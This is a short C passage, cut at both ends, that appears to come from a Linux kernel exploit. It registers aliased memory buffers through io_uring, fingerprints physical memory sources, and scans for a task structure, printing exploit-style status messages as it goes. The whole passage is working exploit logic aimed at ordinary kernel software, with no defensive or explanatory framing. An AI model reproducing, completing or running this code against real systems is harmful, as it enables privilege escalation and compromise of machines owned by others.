      map_aliases(c[i].fd);
      struct iovec v = {alias, (size_t)NALIAS * MB2};
      int r = io_uring_register_buffers(&ring, &v, 1);
      if (r < 0) {
        printf("[-] register: %s\n", strerror(-r));
        continue;
      }
      int node = mapping_node(c[i].map);
      long sp = probe_source();
      int low = (sp >= 0 && sp < 0x2000000L);
      printf("[*] candidate node=%d%s\n", node,
             low ? " (low physical source fingerprinted)" : "");
      int doscan = (pass == 0) ? low : (!low && node == 0);
      if (doscan) {
        scan_total = (size_t)NALIAS * MB2;
        size_t t = scan_task(stack);
        if (t != (size_t)-1)
          return t;
      } else if (pass == 0 && !low) {
        puts("[*] deferring non-low source until low sources are tried");
